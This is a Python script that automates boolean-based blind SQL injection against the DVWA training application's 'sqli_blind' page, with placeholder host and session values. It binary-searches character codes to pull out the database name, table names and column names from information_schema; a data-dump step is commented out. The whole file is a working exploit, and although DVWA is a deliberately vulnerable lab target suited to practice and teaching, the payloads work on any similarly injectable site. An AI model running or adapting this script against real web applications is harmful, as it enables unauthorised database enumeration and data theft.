import urllib
from urllib import request, parse
from bs4 import BeautifulSoup
from urllib.parse import urlencode as uc
import requests
header={
    'Host': '[YOUR IP]',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Referer': 'http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/',
    'Cookie': 'security=low; PHPSESSID=[YOUR PHPSESSID]',
    'Upgrade-Insecure-Requests': '1'
}
url = 'http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/'
def check(response):
    '''
    check found
    '''
    text = response.text
    return text.find('MISSING')==-1
def str2hex(s):
    ret='0x'
    for i in s:
        ret+=str(hex(ord(i)))[2:]
    return ret
def guessDbLength():
    print('Start guess database length:')
    for i in range(1,10):
        values = {}
        values['id']="1' and length(database())="+str(i)+"#"
        values['Submit']='Submit'
        newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
        response = requests.get(newurl,params=values,headers=header)
        if check(response):
            print('Database length is ',i)
            return i
def guessDbName(len):
    ret=''
    print('Start guess database name:')
    for i in range(1,len+1):
        l=1;r=127;ans=0
        while(l<=r):
            mid=(l+r)//2
            values = {}
            values['id']="1' and ascii(substr(database(),%s,1))>=%s #"%(str(i),str(mid))
            values['Submit']='Submit'
            newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
            response = requests.get(newurl,params=values,headers=header)
            if check(response):
                l=mid+1
                ans=mid
            else:
                r=mid-1
        ret+=chr(ans)
    print('Database name is',ret)
    return ret

def guessTbNumber():
    print('Start guess table number:')
    for i in range(1,10):
        values = {}
        values['id']="1' and (select count(table_name) from information_schema.tables where table_schema=database())=%s #" % (str(i))
        values['Submit']='Submit'
        newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
        response = requests.get(newurl,params=values,headers=header)
        if check(response):
            print('Table number is ',i)
            return i
def guessTbLength(num):
    ret=[]
    print('Start guess table length:')
    for j in range(num):
        for i in range(1,10):
            values = {}
            values['id']="1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),1))=%s#" % (str(j),str(i))
            values['Submit']='Submit'
            newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
            response = requests.get(newurl,params=values,headers=header)
            if check(response):
                ret.append(i)
                break
    print('Table length is ',ret)
    return ret
def guessTbName(nums):
    ret=[]
    print('Start guess table name:')
    for j,num in enumerate(nums):
        cur=''
        for i in range(1,num+1):
            l=1;r=127;ans=0
            while(l<=r):
                mid=(l+r)//2
                values = {}
                values['id']="1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1))>=%s #"%(str(j),str(i),str(mid))
                values['Submit']='Submit'
                newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
                response = requests.get(newurl,params=values,headers=header)
                if check(response):
                    l=mid+1
                    ans=mid
                else:
                    r=mid-1
            cur+=chr(ans)
        ret.append(cur)
    print('Table name is',ret)
    return ret
def guessFieldNumber(TbNames):
    print('Start guess field number:')
    ret=[]
    for TbName in TbNames:
        for i in range(1,15):
            values = {}
            values['id']="1' and (select count(column_name) from information_schema.columns where table_name= '%s')=%s # " % (TbName,str(i))
            values['Submit']='Submit'
            newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
            response = requests.get(newurl,params=values,headers=header)
            if check(response):
                ret.append(i)
                break
    print('Field number is ',ret)
    return ret
def guessFieldLength(TbNames,FieldNumbers):
    ret=[]
    print('Start guess field length:')
    for i,TbName in enumerate(TbNames):
        ret.append([])
        for j in range(FieldNumbers[i]):
            for k in range(1,20):
                values = {}
                values['id']="1' and length(substr((select column_name from information_schema.columns where table_name= '%s' limit %s,1),1))=%s #" % (TbName,str(j),str(k))
                values['Submit']='Submit'
                newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
                response = requests.get(newurl,params=values,headers=header)
                if check(response):
                    ret[i].append(k)
                    break
    print('Field length is ',ret)
    return ret
def guessFieldName(TbNames,FieldLengths):
    ret=[]
    print('Start guess field name:')
    for i,TbName in enumerate(TbNames):
        ret.append([])
        for j,FieldLength in enumerate(FieldLengths[i]):
            cur=''
            for k in range(1,FieldLength+1):
                l=1;r=127;ans=0
                while(l<=r):
                    mid=(l+r)//2
                    values = {}
                    values['id']="1' and ascii(substr((select column_name from information_schema.columns where table_name= '%s' limit %s,1),%s,1))>=%s #"%(TbName,str(j),str(k),str(mid))
                    values['Submit']='Submit'
                    newurl = "http://[YOUR IP]/DVWA-2.0.1/vulnerabilities/sqli_blind/"
                    response = requests.get(newurl,params=values,headers=header)
                    if check(response):
                        l=mid+1
                        ans=mid
                    else:
                        r=mid-1
                cur+=chr(ans)
            ret[i].append(cur)
    print('Field name is',ret)
    return ret
DbLength = guessDbLength()
guessDbName(DbLength)
TbNumber = guessTbNumber()
TbLengths = guessTbLength(TbNumber)
TbNames = guessTbName(TbLengths)
FieldNumbers = guessFieldNumber(TbNames)
FieldLengths = guessFieldLength(TbNames,FieldNumbers)
FieldNames = guessFieldName(TbNames,FieldLengths)
#Datasets = guessData(TbNames,FieldNames)
